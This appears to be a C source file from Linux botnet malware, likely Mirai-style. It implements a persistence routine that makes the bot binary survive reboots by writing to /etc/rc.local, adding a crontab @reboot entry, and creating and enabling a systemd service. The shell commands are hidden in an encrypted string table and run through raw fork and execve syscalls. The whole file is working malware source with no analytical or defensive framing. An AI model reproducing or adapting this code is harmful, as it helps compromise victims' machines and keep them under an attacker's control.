#include "headers/persistence.h"
#include "../../utils/headers/syscalls.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/includes.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "../../utils/headers/attack.h"
#include "../../encryption/chacha20_table.h"

/* Missing function declarations */
int sys_access(const char *pathname, int mode);
int sys_readlink(char *path, char *buf, size_t bufsiz);
int sys_mount(const char *source, const char *target, const char *filesystemtype, unsigned long mountflags, const void *data);
int sys_open(const char *pathname, int flags, int mode);
int sys_write(int fd, const void *buf, int count);
void sys_exit(int status);

void persistence_deploy(char *bot_path) {
    char cmd[4096];
    
    // Vector 1: /etc/rc.local
    if (sys_access(enc[ETC_RC_LOCAL].string, 2 /*W_OK*/) == 0) {
        sprintf(cmd, enc[RC_LOCAL_CMD].string, bot_path, enc[ETC_RC_LOCAL].string, enc[ETC_RC_LOCAL].string, bot_path, enc[ETC_RC_LOCAL].string, enc[ETC_RC_LOCAL].string);
        int pid = sys_fork();
        if (pid == 0) {
            char *args[] = {enc[BIN_SH].string, "-c", cmd, NULL};
            _syscall3(__NR_execve, (long)enc[BIN_SH].string, (long)args, 0);
            _syscall1(__NR_exit, 0);
        }
    }

    // Vector 2: crontab @reboot
    sprintf(cmd, enc[CRON_REBOOT_CMD].string, bot_path);
    int pid2 = _syscall0(__NR_fork);
    if (pid2 == 0) {
        char *args[] = {enc[BIN_SH].string, "-c", cmd, NULL};
        _syscall3(__NR_execve, (long)enc[BIN_SH].string, (long)args, 0);
        _syscall1(__NR_exit, 0);
    }

    // Vector 3: systemd
    if (sys_access(enc[ETC_SYSTEMD_SYSTEM].string, 2 /*W_OK*/) == 0) {
        char service_path[256];
        sprintf(service_path, enc[SERVICE_FILENAME_FMT].string, enc[ETC_SYSTEMD_SYSTEM].string);
        int fd = sys_open(service_path, 0x41 /*WR|CREAT|TRUNC*/, 0644);
        if (fd >= 0) {
            char service[512];
            int slen = sprintf(service, enc[SERVICE_CONTENT].string, bot_path);
            sys_write(fd, service, slen);
            sys_close(fd);
            int pid3 = sys_fork();
            if (pid3 == 0) {
                char *args[] = {enc[BIN_SH].string, "-c", enc[SYSTEMD_ENABLE_CMD].string, NULL};
                _syscall3(__NR_execve, (long)enc[BIN_SH].string, (long)args, 0);
                sys_exit(0);
            }
        }
    }
}
